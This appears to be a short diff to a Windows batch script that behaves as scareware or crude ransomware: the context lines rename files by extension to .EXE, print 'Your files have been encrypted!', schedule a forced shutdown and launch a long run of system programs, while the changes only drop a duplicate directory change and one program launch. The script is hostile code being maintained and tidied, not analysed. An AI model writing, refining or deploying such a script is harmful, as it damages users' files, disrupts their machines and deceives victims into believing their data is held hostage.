@@ -30,7 +30,6 @@ REN *.WMZ *.EXE
 echo Your files have been encrypted!
 shutdown -s -t 10000
 cd C:\Windows\System32
-cd C:\Windows\System32
 start control.exe
 start notepad.exe
 start mspaint.exe
@@ -79,7 +78,6 @@ start conhost.exe
 start consent.exe
 start ndadmin.exe
 start grpconv.exe
-start gpedit.exe
 start hdwwiz.exe
 start psr.exe
 start proquota.exe
